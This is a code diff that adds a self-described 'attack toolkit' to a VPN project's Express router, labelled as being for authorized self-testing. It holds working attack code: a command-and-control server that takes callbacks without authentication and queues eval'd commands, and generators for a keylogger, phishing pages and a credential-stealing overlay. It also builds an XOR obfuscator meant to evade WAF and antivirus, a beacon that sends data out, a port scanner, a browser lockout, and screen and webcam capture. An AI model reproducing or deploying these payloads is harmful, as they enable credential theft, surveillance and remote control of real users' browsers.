@@ -839,4 +839,393 @@ router.post("/headers", async (req, res) => {
   res.json({ ok: true, status, headers: result });
 });
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// ATTACK TOOLKIT — Twizted v1.0 Trojan Technique Implementations
+// For authorized self-testing ONLY. Developers deploy these against their own
+// systems to verify real defenses hold against real attack scenarios.
+// Sources: Keylog.bas · Password.bas · Crypt.bas · CLIENT.BAS
+//          Firewall.bas · Global.bas · disablectlaltdel.bas · Monitor.bas
+// ═══════════════════════════════════════════════════════════════════════════════
+
+import net from "net";
+
+// ─── C2 In-Memory Store ───────────────────────────────────────────────────────
+// keyed by sessionId → event list (newest first)
+const c2Sessions = new Map<string, { ts: string; type: string; data: any; ip: string; ua: string }[]>();
+const c2Commands = new Map<string, string[]>(); // sessionId → pending JS commands
+const MAX_C2_SESSIONS  = 50;
+const MAX_C2_EVENTS    = 200;
+
+function c2Prune() {
+  if (c2Sessions.size > MAX_C2_SESSIONS) {
+    const oldest = [...c2Sessions.keys()].slice(0, c2Sessions.size - MAX_C2_SESSIONS);
+    oldest.forEach(k => { c2Sessions.delete(k); c2Commands.delete(k); });
+  }
+}
+
+// PUBLIC ─ POST /redteam-scan/c2/ingest
+// Receives callbacks from all deployed payloads. Registered before requireAuth
+// in index.ts so payloads can reach it cross-origin without auth cookies.
+router.post("/c2/ingest", (req, res) => {
+  const sid  = String((req.query.sid as string) || req.body?.sid || "default").slice(0, 64);
+  const ip   = String(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "?").split(",")[0].trim();
+  const ua   = String(req.headers["user-agent"] || "");
+  const type = String((req.query.t  as string) || req.body?.t  || "beacon");
+  const data = req.body ?? {};
+
+  if (!c2Sessions.has(sid)) c2Sessions.set(sid, []);
+  const evts = c2Sessions.get(sid)!;
+  if (evts.length < MAX_C2_EVENTS) evts.unshift({ ts: new Date().toISOString(), type, data, ip, ua });
+  c2Prune();
+
+  res.header("Access-Control-Allow-Origin", "*");
+  // Return any queued command for this session
+  const cmds = c2Commands.get(sid) ?? [];
+  const cmd  = cmds.shift();
+  res.json({ ok: true, cmd: cmd ?? null });
+});
+
+router.options("/c2/ingest", (_req, res) => {
+  res.header("Access-Control-Allow-Origin",  "*");
+  res.header("Access-Control-Allow-Methods", "POST, OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type");
+  res.sendStatus(204);
+});
+
+// GET /redteam-scan/c2/events?sid=...
+router.get("/c2/events", (req, res) => {
+  const sid = String((req.query.sid as string) || "default").slice(0, 64);
+  res.json({ ok: true, sid, events: c2Sessions.get(sid) ?? [] });
+});
+
+// DELETE /redteam-scan/c2/events?sid=...
+router.delete("/c2/events", (req, res) => {
+  const sid = String((req.query.sid as string) || "default").slice(0, 64);
+  c2Sessions.delete(sid);
+  c2Commands.delete(sid);
+  res.json({ ok: true, cleared: true });
+});
+
+// POST /redteam-scan/c2/cmd — push JS command to be picked up by next beacon poll
+router.post("/c2/cmd", (req, res) => {
+  const { sid, code } = req.body as { sid: string; code: string };
+  if (!sid || !code) return res.status(400).json({ error: "sid and code required" });
+  if (!c2Commands.has(sid)) c2Commands.set(sid, []);
+  c2Commands.get(sid)!.push(String(code).slice(0, 4096));
+  return res.json({ ok: true, queued: true });
+});
+
+// ─── Payload Generators ───────────────────────────────────────────────────────
+
+// POST /redteam-scan/toolkit/keylogger  (Keylog.bas)
+// Generates a JS keylogger payload: captures keystrokes, form submits, clipboard pastes
+router.post("/toolkit/keylogger", (req, res) => {
+  const { callbackUrl, sid = "default", flushInterval = 15, minKeys = 10 } = req.body as {
+    callbackUrl: string; sid?: string; flushInterval?: number; minKeys?: number;
+  };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+
+  const payload = `/* Keylog.bas → JavaScript Keylogger | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}', _sid='${sid}', _buf=[], _fi=${Math.max(5,Number(flushInterval))}, _mn=${Math.max(1,Number(minKeys))};
+  function _flush(){
+    if(_buf.length===0)return;
+    var d=JSON.stringify({t:'keylog',sid:_sid,d:_buf,url:location.href,ts:Date.now()});
+    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=keylog',d)}catch(e){fetch(_cb+'?sid='+_sid+'&t=keylog',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
+    _buf=[];
+  }
+  // Capture individual keystrokes (Keylog.bas GetAsyncKeyState equivalent)
+  document.addEventListener('keydown',function(e){
+    _buf.push({k:e.key,kc:e.keyCode,ctrl:e.ctrlKey,shift:e.shiftKey,alt:e.altKey,el:(document.activeElement||{}).tagName||'?',ts:Date.now()});
+    if(_buf.length>=_mn)_flush();
+  },true);
+  // Capture form submissions — full field values (Password.bas crossover)
+  document.addEventListener('submit',function(e){
+    var fd={},form=e.target;
+    try{new FormData(form).forEach(function(v,k){fd[k]=v})}catch(ex){}
+    var d=JSON.stringify({t:'form_submit',sid:_sid,d:fd,action:(form.action||location.href),url:location.href,ts:Date.now()});
+    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=form',d)}catch(e){fetch(_cb+'?sid='+_sid+'&t=form',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
+  },true);
+  // Capture clipboard paste (clipboard API monitoring)
+  document.addEventListener('paste',function(e){
+    var txt='';try{txt=(e.clipboardData||window.clipboardData).getData('text')}catch(ex){}
+    if(txt){_buf.push({k:'[PASTE:'+txt.slice(0,200)+']',el:(document.activeElement||{}).tagName||'?',ts:Date.now()})}
+  },true);
+  // Flush on interval and page unload
+  setInterval(_flush,_fi*1000);
+  window.addEventListener('beforeunload',_flush);
+})();`;
+
+  return res.json({ ok: true, module: "Keylog.bas", payload, language: "javascript",
+    deployHint: "Inject via <script> tag, XSS, or browser extension. Runs silently in page context." });
+});
+
+// POST /redteam-scan/toolkit/credential-harvester  (Password.bas)
+// Generates: (1) standalone HTML phishing page, (2) JS overlay injector
+router.post("/toolkit/credential-harvester", (req, res) => {
+  const { callbackUrl, sid = "default", targetBrand = "Login", mode = "page" } = req.body as {
+    callbackUrl: string; sid?: string; targetBrand?: string; mode?: "page" | "overlay";
+  };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+
+  const pagePl = `<!DOCTYPE html>
+<!-- Password.bas → Credential Harvester | Twizted v1.0 technique -->
+<html><head><meta charset="utf-8"><title>${targetBrand}</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0f0f0f;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:system-ui,sans-serif}
+.card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:100%;max-width:400px}
+h2{color:#fff;margin-bottom:24px;font-size:20px}label{color:#aaa;font-size:13px;display:block;margin-bottom:6px}
+input{width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px 14px;border-radius:6px;font-size:14px;margin-bottom:16px}
+input:focus{outline:none;border-color:#0080ff}button{width:100%;background:#0080ff;color:#fff;border:none;padding:12px;border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}
+.err{color:#f55;font-size:12px;margin-top:8px;display:none}</style></head>
+<body><div class="card"><h2>${targetBrand}</h2>
+<form id="f"><label>Email / Username</label><input type="text" id="u" autocomplete="username" required>
+<label>Password</label><input type="password" id="p" autocomplete="current-password" required>
+<button type="submit">Sign in</button><div class="err" id="e">Invalid credentials. Please try again.</div></form></div>
+<script>document.getElementById('f').addEventListener('submit',function(ev){ev.preventDefault();
+var d=JSON.stringify({t:'creds',sid:'${sid}',username:document.getElementById('u').value,password:document.getElementById('p').value,ua:navigator.userAgent,url:location.href,ts:Date.now()});
+fetch('${callbackUrl}?sid=${sid}&t=creds',{method:'POST',body:d,headers:{'Content-Type':'application/json'}}).catch(function(){navigator.sendBeacon('${callbackUrl}?sid=${sid}&t=creds',d)});
+document.getElementById('e').style.display='block';document.getElementById('p').value='';});</script></body></html>`;
+
+  const overlayPl = `/* Password.bas → Credential Overlay Injector | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}';
+  var _el=document.createElement('div');
+  _el.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif';
+  _el.innerHTML='<div style="background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:380px"><h2 style="color:#fff;margin-bottom:20px;font-size:18px">Session expired — sign in again</h2><label style="color:#aaa;font-size:13px;display:block;margin-bottom:6px">Email / Username</label><input id="_u" type="text" style="width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px;border-radius:6px;font-size:14px;margin-bottom:12px"><label style="color:#aaa;font-size:13px;display:block;margin-bottom:6px">Password</label><input id="_p" type="password" style="width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px;border-radius:6px;font-size:14px;margin-bottom:16px"><button id="_sb" style="width:100%;background:#0080ff;color:#fff;border:none;padding:12px;border-radius:6px;font-size:15px;cursor:pointer">Continue</button></div>';
+  document.body.appendChild(_el);
+  document.getElementById('_sb').addEventListener('click',function(){
+    var d=JSON.stringify({t:'overlay_creds',sid:_sid,username:document.getElementById('_u').value,password:document.getElementById('_p').value,host:location.hostname,ua:navigator.userAgent,ts:Date.now()});
+    fetch(_cb+'?sid='+_sid+'&t=creds',{method:'POST',body:d,headers:{'Content-Type':'application/json'}}).catch(function(){navigator.sendBeacon(_cb+'?sid='+_sid+'&t=creds',d)});
+    _el.remove();
+  });
+})();`;
+
+  return res.json({ ok: true, module: "Password.bas", payloads: { page: pagePl, overlay: overlayPl }, language: mode === "overlay" ? "javascript" : "html",
+    payload: mode === "overlay" ? overlayPl : pagePl,
+    deployHint: mode === "overlay" ? "Inject via <script> tag or XSS — overlays a sign-in modal on any page." : "Host as standalone HTML page or serve via phishing proxy." });
+});
+
+// POST /redteam-scan/toolkit/obfuscate  (Crypt.bas)
+// XOR-encodes any payload with a key, outputs self-decoding JS stub
+router.post("/toolkit/obfuscate", (req, res) => {
+  const { payload: rawPayload, key = "TWIZTED", wrapEval = true } = req.body as {
+    payload: string; key?: string; wrapEval?: boolean;
+  };
+  if (!rawPayload) return res.status(400).json({ error: "payload required" });
+
+  const k = String(key || "TWIZTED");
+  const bytes = Buffer.from(rawPayload, "utf8");
+  const xored: number[] = [];
+  for (let i = 0; i < bytes.length; i++) xored.push(bytes[i] ^ k.charCodeAt(i % k.length));
+  const encoded = Buffer.from(xored).toString("base64");
+
+  // Also generate hex-encoded version (Crypt.bas used both)
+  const hexStr = xored.map(b => b.toString(16).padStart(2, "0")).join("");
+
+  const stub = `/* Crypt.bas → XOR Obfuscated Payload | Twizted v1.0 technique | key="${k}" */
+(function(){var _d='${encoded}',_k='${k}',_r=atob(_d);var _b=new Uint8Array(_r.length);for(var i=0;i<_r.length;i++)_b[i]=_r.charCodeAt(i)^_k.charCodeAt(i%_k.length);var _s=new TextDecoder().decode(_b);${wrapEval ? "eval(_s);" : "/* decoded in _s: use _s as needed */"}})()\n/* hex: ${hexStr.slice(0, 80)}${hexStr.length > 80 ? "…" : ""} */`;
+
+  return res.json({ ok: true, module: "Crypt.bas", payload: stub, language: "javascript",
+    key: k, encodedLength: encoded.length, hexPreview: hexStr.slice(0, 64),
+    deployHint: "Wrap any payload in XOR obfuscation. Bypasses naive string-based WAF/AV detection." });
+});
+
+// POST /redteam-scan/toolkit/c2-beacon  (CLIENT.BAS)
+// Generates a C2 beacon payload — polls for commands, exfiltrates session context
+router.post("/toolkit/c2-beacon", (req, res) => {
+  const { callbackUrl, sid, intervalMs = 5000, stealStorage = true, stealCookies = true } = req.body as {
+    callbackUrl: string; sid?: string; intervalMs?: number; stealStorage?: boolean; stealCookies?: boolean;
+  };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+  const beaconSid = sid || Math.random().toString(36).substring(2, 11);
+
+  const payload = `/* CLIENT.BAS → C2 Beacon | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}',_sid='${beaconSid}',_iv=${Math.max(2000,Number(intervalMs))};
+  var _tick=0;
+  function _gather(){
+    var o={t:'beacon',sid:_sid,tick:_tick++,url:location.href,ref:document.referrer,ua:navigator.userAgent,ts:Date.now()${stealStorage ? `,ls_keys:Object.keys(localStorage||{}),ss_keys:Object.keys(sessionStorage||{})` : ""}${stealCookies ? `,cookie_count:(document.cookie||'').split(';').filter(function(c){return c.trim()}).length` : ""}};
+    // Also grab any visible form field values
+    var fv={};document.querySelectorAll('input:not([type=hidden]),select,textarea').forEach(function(el){if(el.name&&el.value&&el.type!=='password')fv[el.name]=el.value;});
+    if(Object.keys(fv).length)o.form_vals=fv;
+    return o;
+  }
+  function _beacon(){
+    var d=JSON.stringify(_gather());
+    fetch(_cb+'?sid='+_sid+'&t=beacon',{method:'POST',body:d,headers:{'Content-Type':'application/json'},mode:'cors',credentials:'omit'})
+      .then(function(r){return r.json()})
+      .then(function(resp){if(resp&&resp.cmd){try{eval(resp.cmd)}catch(ex){console.warn('cmd err',ex)}}})
+      .catch(function(){try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=beacon',d)}catch(ex){}});
+  }
+  setInterval(_beacon,_iv);
+  _beacon();
+  // Also beacon on page visibility change (tab switch detection)
+  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')_beacon()});
+})();`;
+
+  return res.json({ ok: true, module: "CLIENT.BAS", payload, language: "javascript",
+    sid: beaconSid, intervalMs, deployHint: "Inject into target page. Beacons home every " + (intervalMs/1000) + "s. Use C2 Command Console to push eval code." });
+});
+
+// POST /redteam-scan/toolkit/port-scan  (Firewall.bas)
+// TCP connect scan — tests which ports are open on a target host
+router.post("/toolkit/port-scan", async (req, res) => {
+  const { host, ports, timeoutMs = 1500 } = req.body as { host: string; ports: number[]; timeoutMs?: number };
+  if (!host || !Array.isArray(ports) || ports.length === 0) return res.status(400).json({ error: "host and ports[] required" });
+  if (ports.length > 500) return res.status(400).json({ error: "Max 500 ports per scan" });
+
+  const to = Math.min(Math.max(Number(timeoutMs), 300), 5000);
+
+  function tcpProbe(h: string, port: number): Promise<{ port: number; open: boolean; banner?: string }> {
+    return new Promise(resolve => {
+      const sock = new net.Socket();
+      let banner = "";
+      const timer = setTimeout(() => { sock.destroy(); resolve({ port, open: false }); }, to);
+      sock.connect(port, h, () => {
+        clearTimeout(timer);
+        sock.setTimeout(600, () => { sock.destroy(); resolve({ port, open: true, banner: banner.trim().slice(0, 80) }); });
+      });
+      sock.on("data", (d: Buffer) => { banner += d.toString("utf8"); });
+      sock.on("close", () => { clearTimeout(timer); resolve({ port, open: true, banner: banner.trim().slice(0, 80) }); });
+      sock.on("error", () => { clearTimeout(timer); resolve({ port, open: false }); });
+    });
+  }
+
+  const COMMON_SERVICES: Record<number, string> = {
+    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",
+    443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",
+    6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB",
+  };
+
+  const results = await Promise.all(ports.map(p => tcpProbe(host, p)));
+  const open = results.filter(r => r.open).map(r => ({ ...r, service: COMMON_SERVICES[r.port] || "?" }));
+
+  return res.json({ ok: true, module: "Firewall.bas", host, scanned: ports.length, open,
+    deployHint: "TCP connect scan from the ProxhqVPN API server. Tests firewall rule coverage." });
+});
+
+// POST /redteam-scan/toolkit/sysrecon  (Global.bas)
+// Generates a browser-side system recon payload — collects navigator, screen, GPU, fonts
+router.post("/toolkit/sysrecon", (req, res) => {
+  const { callbackUrl, sid = "default" } = req.body as { callbackUrl: string; sid?: string };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+
+  const payload = `/* Global.bas → System Recon | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}';
+  function _glr(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return'n/a';var ext=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(ext?ext.UNMASKED_RENDERER_WEBGL:gl.RENDERER);}catch(e){return'n/a'}}
+  function _fonts(){var tFonts=['Arial','Calibri','Cambria','Comic Sans MS','Courier New','Georgia','Helvetica','Impact','Times New Roman','Trebuchet MS','Verdana','Wingdings','Consolas','Monaco'],found=[];var s=document.createElement('span');s.style.cssText='position:absolute;left:-9999px;font-size:72px';document.body.appendChild(s);var _def={w:0,h:0};s.style.fontFamily='monospace';_def.w=s.offsetWidth;_def.h=s.offsetHeight;tFonts.forEach(function(f){s.style.fontFamily=f+',monospace';if(s.offsetWidth!==_def.w||s.offsetHeight!==_def.h)found.push(f)});document.body.removeChild(s);return found}
+  function _battery(){if(navigator.getBattery)return navigator.getBattery().then(function(b){return{charging:b.charging,level:Math.round(b.level*100),chargingTime:b.chargingTime}}).catch(function(){return null});return Promise.resolve(null)}
+  _battery().then(function(batt){
+    var info={t:'sysrecon',sid:_sid,ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,langs:(navigator.languages||[]).join(','),plugins:Array.from(navigator.plugins||[]).map(function(p){return p.name}).join('|'),screen:screen.width+'x'+screen.height+'@'+screen.colorDepth+'bit',avail:screen.availWidth+'x'+screen.availHeight,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,touch:'ontouchstart'in window,cookieEnabled:navigator.cookieEnabled,storage:typeof localStorage!=='undefined',idb:typeof indexedDB!=='undefined',sw:typeof navigator.serviceWorker!=='undefined',webgl:_glr(),fonts:_fonts(),battery:batt,connection:navigator.connection?{type:(navigator.connection.effectiveType||'?'),down:(navigator.connection.downlink||0)+'Mb'}:null,hardwareConcurrency:navigator.hardwareConcurrency||0,memory:(navigator.deviceMemory||0)+'GB',url:location.href,ref:document.referrer,ls_keys:Object.keys(localStorage||{}),ss_keys:Object.keys(sessionStorage||{}),cookie_len:(document.cookie||'').length,ts:new Date().toISOString()};
+    var d=JSON.stringify(info);
+    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=sysrecon',d)}catch(ex){fetch(_cb+'?sid='+_sid+'&t=sysrecon',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
+  });
+})();`;
+
+  return res.json({ ok: true, module: "Global.bas", payload, language: "javascript",
+    deployHint: "Single-shot recon. Fires on load, collects full browser fingerprint, and beacons home." });
+});
+
+// POST /redteam-scan/toolkit/keyhijack  (disablectlaltdel.bas)
+// Generates a keyboard hijack + browser lockout payload
+router.post("/toolkit/keyhijack", (req, res) => {
+  const { blockDevTools = true, blockViewSource = true, blockRightClick = true, blockCopyPaste = false, callbackUrl, sid = "default" } = req.body as {
+    blockDevTools?: boolean; blockViewSource?: boolean; blockRightClick?: boolean; blockCopyPaste?: boolean;
+    callbackUrl?: string; sid?: string;
+  };
+
+  const payload = `/* disablectlaltdel.bas → Keyboard Hijack | Twizted v1.0 technique */
+(function(){
+  var _blocked=[];
+  document.addEventListener('keydown',function(e){
+    // DevTools / inspection (Ctrl+Shift+I/J/C, F12)
+    if(${blockDevTools}){if(e.key==='F12'){e.preventDefault();e.stopPropagation();_blocked.push('F12');return false}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C')){e.preventDefault();e.stopPropagation();return false}}
+    // View source (Ctrl+U), Save (Ctrl+S), Print (Ctrl+P)
+    if(${blockViewSource}){if(e.ctrlKey&&(e.key==='u'||e.key==='U'||e.key==='s'||e.key==='S'||e.key==='p'||e.key==='P')){e.preventDefault();e.stopPropagation();return false}}
+    // Copy/paste (Ctrl+C/V/A/X)
+    if(${blockCopyPaste}){if(e.ctrlKey&&(e.key==='c'||e.key==='v'||e.key==='a'||e.key==='x')){e.preventDefault();e.stopPropagation();return false}}
+    // F5 refresh
+    if(e.key==='F5'){e.preventDefault();e.stopPropagation();return false}
+  },true);
+  // Context menu block
+  if(${blockRightClick}){document.addEventListener('contextmenu',function(e){e.preventDefault();return false},true)}
+  // Text selection block (disablectlaltdel.bas SelectAll equiv)
+  document.addEventListener('selectstart',function(e){if(e.target.nodeName!=='INPUT'&&e.target.nodeName!=='TEXTAREA'){e.preventDefault();return false}},true);
+  // Drag block (prevent dragging page elements to reveal source URLs)
+  document.addEventListener('dragstart',function(e){e.preventDefault();return false},true);
+  ${callbackUrl ? `// Report block attempts\n  document.addEventListener('keydown',function(e){if(_blocked.length>0){var d=JSON.stringify({t:'keyhijack',sid:'${sid}',blocked:_blocked,ts:Date.now()});fetch('${callbackUrl}?sid=${sid}&t=keyhijack',{method:'POST',body:d,mode:'no-cors'}).catch(function(){});_blocked=[]}},true);\n` : ""}
+})();`;
+
+  return res.json({ ok: true, module: "disablectlaltdel.bas", payload, language: "javascript",
+    deployHint: "Prevents users/analysts from inspecting the page. Inject to test if CSP/DevTools policies enforce inspection controls." });
+});
+
+// POST /redteam-scan/toolkit/screen-monitor  (Monitor.bas)
+// Generates a screen capture / webcam / canvas-fingerprint payload
+router.post("/toolkit/screen-monitor", (req, res) => {
+  const { callbackUrl, sid = "default", captureInterval = 30, mode = "canvas" } = req.body as {
+    callbackUrl: string; sid?: string; captureInterval?: number; mode?: "canvas" | "screen" | "webcam";
+  };
+  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
+
+  const canvasPl = `/* Monitor.bas → Canvas Fingerprint | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}';
+  // Canvas rendering fingerprint (GPU/font anti-aliasing reveals device identity)
+  var c=document.createElement('canvas');c.width=280;c.height=60;var ctx=c.getContext('2d');
+  ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);
+  ctx.fillStyle='#069';ctx.fillText('Twizted v1.0 Monitor',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Twizted v1.0 Monitor',4,17);
+  var fp=c.toDataURL();
+  // Screen metrics
+  var info={t:'canvas_fp',sid:_sid,fp:fp,screen:screen.width+'x'+screen.height,avail:screen.availWidth+'x'+screen.availHeight,dpr:devicePixelRatio||1,cd:screen.colorDepth,ts:Date.now()};
+  var d=JSON.stringify(info);
+  try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=canvas_fp',d)}catch(ex){fetch(_cb+'?sid='+_sid+'&t=canvas_fp',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
+})();`;
+
+  const screenPl = `/* Monitor.bas → Screen Capture | Twizted v1.0 technique */
+/* Tests whether getDisplayMedia() is permitted — requires user approval gesture */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}',_iv=${Math.max(10,Number(captureInterval))};
+  function _snap(stream){
+    var v=document.createElement('video');v.srcObject=stream;v.play().then(function(){
+      setTimeout(function(){
+        var c=document.createElement('canvas');c.width=v.videoWidth||1920;c.height=v.videoHeight||1080;
+        c.getContext('2d').drawImage(v,0,0);
+        c.toBlob(function(b){
+          var fd=new FormData();fd.append('t','screenshot');fd.append('sid',_sid);fd.append('ts',Date.now().toString());fd.append('file',b,'screen.jpg');
+          fetch(_cb+'?sid='+_sid+'&t=screenshot',{method:'POST',body:fd}).catch(function(){});
+        },'image/jpeg',0.5);
+      },500);
+    }).catch(function(){});
+  }
+  navigator.mediaDevices.getDisplayMedia({video:{width:{ideal:1920},height:{ideal:1080}},audio:false})
+    .then(function(stream){_snap(stream);setInterval(function(){_snap(stream)},_iv*1000)})
+    .catch(function(e){var d=JSON.stringify({t:'screen_denied',sid:_sid,err:e.message,ts:Date.now()});navigator.sendBeacon(_cb+'?sid='+_sid+'&t=screen_denied',d)});
+})();`;
+
+  const webcamPl = `/* Monitor.bas → Webcam Capture | Twizted v1.0 technique */
+(function(){
+  var _cb='${callbackUrl}',_sid='${sid}';
+  navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720}},audio:false})
+    .then(function(stream){
+      var v=document.createElement('video');v.srcObject=stream;v.play().then(function(){
+        setTimeout(function(){
+          var c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
+          c.getContext('2d').drawImage(v,0,0);
+          c.toBlob(function(b){
+            var fd=new FormData();fd.append('t','webcam');fd.append('sid',_sid);fd.append('ts',Date.now().toString());fd.append('file',b,'cam.jpg');
+            fetch(_cb+'?sid='+_sid+'&t=webcam',{method:'POST',body:fd}).catch(function(){});
+          },'image/jpeg',0.6);
+          stream.getTracks().forEach(function(t){t.stop()});
+        },800);
+      });
+    }).catch(function(e){var d=JSON.stringify({t:'cam_denied',sid:_sid,err:e.message,ts:Date.now()});navigator.sendBeacon(_cb+'?sid='+_sid+'&t=cam_denied',d)});
+})();`;
+
+  const payload = mode === "screen" ? screenPl : mode === "webcam" ? webcamPl : canvasPl;
+  return res.json({ ok: true, module: "Monitor.bas", payload, language: "javascript", mode,
+    deployHint: mode === "canvas" ? "No user permission needed — silently captures GPU/font fingerprint." : mode === "screen" ? "Requires user to click 'Share Screen' — tests if users grant screen access to injected scripts." : "Requires getUserMedia permission — tests webcam access policy." });
+});
+
 export default router;
